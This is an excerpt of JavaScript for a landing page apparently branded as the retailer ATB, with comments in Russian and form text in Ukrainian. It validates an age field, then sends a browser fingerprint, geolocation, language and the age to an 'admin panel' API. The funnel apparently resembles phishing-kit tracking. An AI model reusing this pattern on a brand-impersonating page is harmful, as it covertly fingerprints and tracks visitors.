...
document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('🚀 Лендинг АТБ инициализирован');
        console.log('📡 Админка:', CONFIG.ADMIN_API_URL);
    }
    
    // Первый экран уже активен в HTML (screen-age-first)
    ...
    // ГЛОБАЛЬНЫЙ обработчик для первого экрана возраста (АТБ)
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'ageFormFirst') {
            e.preventDefault();
            
            const ageScreen = document.getElementById('screen-age-first');
            if (!ageScreen || !ageScreen.classList.contains('active')) {
                return;
            }
            
            const input = document.getElementById('ageInputFirst');
            if (!input) return;
            
            const age = parseInt(input.value);
            
            if (isNaN(age) || age < 18 || age > 100) {
                showError('ageErrorFirst', 'Введіть коректний вік (від 18 до 100)');
                return;
            }
            
            userData.age = age;
            
            // Создаем сессию с возрастом
            if (!sessionToken) {
                await createSessionWithAge(age);
            } else {
                // Если сессия уже есть, просто отправляем возраст
                await sendData('age', age);
            }
...
// Создание сессии с возрастом (для лендинга АТБ)
async function createSessionWithAge(age) {
    try {
        const fingerprint = await generateFingerprint();
        const geolocation = CONFIG.SETTINGS.sendGeolocation ? await getGeolocation() : null;
        ...
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            ...
            body: JSON.stringify({
                ...
                language: navigator.language,
                geolocation: geolocation,
                age: age  // ← Добавляем возраст сразу при создании сессии
            })
        });
        ...
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Сессия создана с возрастом:', sessionToken, 'Age:', age);
        }
